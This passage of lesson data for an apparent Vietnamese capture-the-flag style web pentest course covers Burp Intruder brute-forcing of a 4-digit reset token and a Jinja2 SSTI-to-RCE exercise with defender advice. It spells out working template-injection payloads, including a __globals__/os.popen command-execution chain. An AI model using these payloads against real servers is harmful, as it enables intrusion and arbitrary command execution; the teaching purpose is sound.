      'Burp Suite Proxy/Repeater/Intruder là bộ ba làm việc chuẩn của pentest web: Proxy chặn bắt request thật giữa browser và server; Repeater cho gửi lại NHIỀU LẦN có chỉnh sửa tay để hiểu logic; Intruder tự động hoá việc thay đổi MỘT vị trí (hoặc nhiều) qua hàng loạt giá trị payload.',
      'Token reset password chỉ 4 số (10.000 khả năng) là không gian quá nhỏ để brute-force thủ công offline trong vài giây — bài học cốt lõi: entropy của token (độ ngẫu nhiên/độ dài) quyết định nó có chống được brute-force hay không, không phải việc "có vẻ ngẫu nhiên".',
      'Phát hiện token đúng qua Intruder thường KHÔNG dựa vào nội dung response (có thể giống nhau) mà dựa vào META-DATA tinh tế: Content-Length khác biệt, status code khác, hoặc thời gian phản hồi (timing side-channel) — kỹ năng đọc bảng kết quả Intruder là chìa khoá.',
      'DEFENDER: token reset password phải đủ dài & random thật (tối thiểu 128-bit entropy, không phải 4 số); BẮT BUỘC rate-limit số lần thử theo email/IP; token phải HẾT HẠN sau thời gian ngắn (5-15 phút) và bị vô hiệu ngay sau khi dùng một lần; trả response GIỐNG NHAU tuyệt đối (cả length, cả timing) cho mọi token sai để không lộ side-channel.',
    ],
    terms: [
      { term: 'Burp Proxy', def: 'Module Burp Suite chặn/bắt mọi request-response giữa browser và server để xem và chỉnh sửa.' },
      { term: 'Burp Repeater', def: 'Module gửi lại MỘT request nhiều lần có chỉnh sửa tay, dùng để hiểu hành vi server từng bước.' },
      { term: 'Burp Intruder', def: 'Module tự động hoá fuzz một hoặc nhiều vị trí trong request qua danh sách payload lớn (vd brute-force token).' },
      { term: 'Entropy của token', def: 'Độ ngẫu nhiên/độ khó đoán của token; token 4 số có entropy quá thấp (chỉ 10.000 khả năng) để chống brute-force.' },
    ],
    initialFilesystem: fsC6M19,
  },
  {
    id: 20,
    chapterId: 6,
    title: 'Bài tốt nghiệp: SSTI tới RCE',
    story:
      'Bài cuối Chương 6. greet.py ghép thẳng tham số name vào template Jinja2 rồi render — đây không phải XSS, đây là Server-Side Template Injection: code chạy ngay TRÊN SERVER bằng Python. Mày sẽ xác nhận lỗi bằng phép toán, rồi leo thang qua chuỗi __class__ kinh điển để chạy lệnh hệ thống và đọc cờ.',
    steps: [
      {
        id: 'inspect',
        description: 'Đọc greet.py xác nhận render_template_string ghép thẳng input, không sandbox',
        match: /^cat\s+.*greet\.py/,
      },
      {
        id: 'confirm_ssti',
        description: 'Xác nhận SSTI bằng phép toán {{7*7}} — nếu trả về 49 (đã tính) thì chắc chắn template engine đang CHẠY input, không chỉ in chuỗi',
        match: /(curl|http).*name=.*7\*7|%7B%7B7\*7%7D%7D/i,
        output: [
          '# GET /greet?name={{7*7}}',
          '<h1>Hello 49</h1>',
          '=> "7*7" bị TÍNH thành 49 chứ không in nguyên văn "{{7*7}}" -> xác nhận Server-Side Template Injection (Jinja2).',
        ].join('\n'),
      },
      {
        id: 'find_chain',
        description: 'Dùng chuỗi __class__.__mro__ kinh điển để từ object string leo tới os module',
        match: /(__class__|__mro__|__subclasses__|__globals__)/i,
        output: [
          "# GET /greet?name={{''.__class__.__mro__[1].__subclasses__()}}",
          "[<class 'type'>, ..., <class 'subprocess.Popen'>, ...]",
          '=> từ một string rỗng, leo qua __class__ (lấy class str) -> __mro__[1] (object) -> __subclasses__() liệt kê',
          '   MỌI class Python đang load được, trong đó có subprocess.Popen -> đường vào để chạy lệnh hệ thống.',
        ].join('\n'),
      },
      {
        id: 'rce',
        description: 'Hoàn thiện payload gọi os.popen qua chuỗi __globals__ để chạy lệnh đọc cờ',
        match: /(curl|http).*(os\.popen|__globals__\[.os.\]|popen.*cat.*flag)/i,
        output: [
          "# GET /greet?name={{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /var/www/html/flag.txt').read() }}",
          '<h1>Hello FLAG{ssti_jinja2_sandbox_escape_to_rce}</h1>',
          '=> SSTI leo thành RCE hoàn chỉnh: từ "ghép chuỗi vào template" tới "chạy lệnh hệ thống tuỳ ý" trong một payload.',
        ].join('\n'),
      },
      {
        id: 'read_flag',
        description: 'Đọc trực tiếp flag.txt để xác nhận nội dung cờ vừa lấy được qua RCE',
        match: /^cat\s+\/var\/www\/html\/flag\.txt/,
      },
    ],
    hints: [
      'Nếu input của mày bị TÍNH TOÁN (không chỉ in ra nguyên văn) bởi server, đó không phải XSS — đó là code chạy trên chính server bằng ngôn ngữ template.',
      'Test nhanh: `?name={{7*7}}` — nếu trang in ra "49" (đã tính), template engine (Jinja2) đang thực thi cú pháp `{{...}}` của mày, không chỉ echo chuỗi.',
      'Từ object string rỗng `\'\'`, leo bằng `.__class__.__mro__[1].__subclasses__()` để liệt kê toàn bộ class Python đang nạp (tìm subprocess.Popen hoặc dùng `__globals__` của một hàm để lấy `__builtins__` rồi `__import__(\'os\').popen(\'cat /var/www/html/flag.txt\').read()` chạy lệnh đọc cờ.',
    ],
    debrief: [
      'SSTI (Server-Side Template Injection) khác XSS ở NƠI CODE CHẠY: XSS chạy JS trong browser nạn nhân; SSTI chạy NGAY TRÊN SERVER bằng chính ngôn ngữ của template engine (Jinja2/Twig/Freemarker) — mức độ nghiêm trọng gần như luôn dẫn tới RCE hoàn chỉnh.',
      'Lỗi gốc là dùng "string concatenation" để build template (`"Hello " + name`) rồi render, thay vì coi name là DỮ LIỆU truyền vào một template CỐ ĐỊNH (`render_template_string("Hello {{ name }}", name=name)`) — cách sau Jinja2 tự escape, cách trước biến input thành CÚ PHÁP TEMPLATE.',
      'Chuỗi `__class__.__mro__[1].__subclasses__()` là kỹ thuật kinh điển "Python sandbox escape": Jinja2 chặn truy cập trực tiếp `import os`, nhưng không chặn được việc duyệt ngược qua thuộc tính object có sẵn (mọi object Python đều có __class__) để chạm tới những class nguy hiểm đã được nạp sẵn trong tiến trình.',
      'DEFENDER: KHÔNG BAO GIỜ ghép input người dùng trực tiếp vào CHUỖI TEMPLATE — luôn truyền input như một BIẾN cho template cố định (`render_template_string(FIXED_TEMPLATE, name=user_input)`); nếu phải cho phép user tự viết template (hiếm), dùng sandboxed environment (Jinja2 SandboxedEnvironment) chặn truy cập __class__/__globals__; nguyên tắc chung: tách triệt để CODE (template) khỏi DATA (input).',
    ],
    terms: [
      { term: 'SSTI', def: 'Server-Side Template Injection: input người dùng được THỰC THI như cú pháp template engine ngay trên server, thường dẫn tới RCE.' },
      { term: 'Jinja2', def: 'Template engine phổ biến của Python (dùng trong Flask); cú pháp {{ expr }} cho phép tính toán/truy cập thuộc tính object.' },
      { term: '__class__.__mro__ chain', def: 'Kỹ thuật sandbox escape kinh điển trong Python: từ object bất kỳ duyệt ngược qua thuộc tính có sẵn để chạm class nguy hiểm (subprocess, os).' },
      { term: 'SandboxedEnvironment', def: 'Môi trường Jinja2 giới hạn, chặn truy cập attribute nguy hiểm (__class__, __globals__) — biện pháp giảm thiểu khi buộc phải render template động.' },
    ],
    initialFilesystem: fsC6M20,
  },
];
